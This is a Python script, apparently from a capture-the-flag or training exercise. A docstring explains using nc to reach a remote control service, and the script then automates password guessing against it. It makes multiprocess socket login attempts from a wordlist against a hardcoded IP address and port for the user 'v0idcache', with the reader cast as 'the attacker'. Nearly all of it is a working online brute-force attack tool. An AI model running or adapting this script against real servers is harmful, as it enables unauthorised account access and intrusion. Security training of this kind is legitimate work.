"""
    If you know the IP address of v0idcache's server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

import socket
import os
from multiprocessing import Pool, Value


host = "142.93.136.81" # IP address here
port = 1337 # Port here
username = "v0idcache"   # Hint: use OSINT
wordlist = "passwords.txt" # Point to wordlist file

found = False

def init(args):
    global found
    found = args

def test_login(password):
    global found

    if found.value > 0:
        return

    password = password.rstrip()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    _ = s.recv(1024)
    s.send(username.encode('ascii'))
    s.send('\n'.encode('ascii'))

    _ = s.recv(1024)
    s.send(password.encode('ascii'))
    s.send('\n'.encode('ascii'))

    response = None
    while response is None:
        response = s.recv(1024).decode('ascii').rstrip()

    print('"' + password + '":\t'  + response)
    if response != 'Fail':
        with found.get_lock():
            found.value += 1
        return

def brute_force():
    with open(wordlist, 'r') as passfile:
        found = Value('i', 0)
        p = Pool(40, initializer = init, initargs = (found, ))
        p.map(test_login, passfile.readlines())

if __name__ == '__main__':
    brute_force()
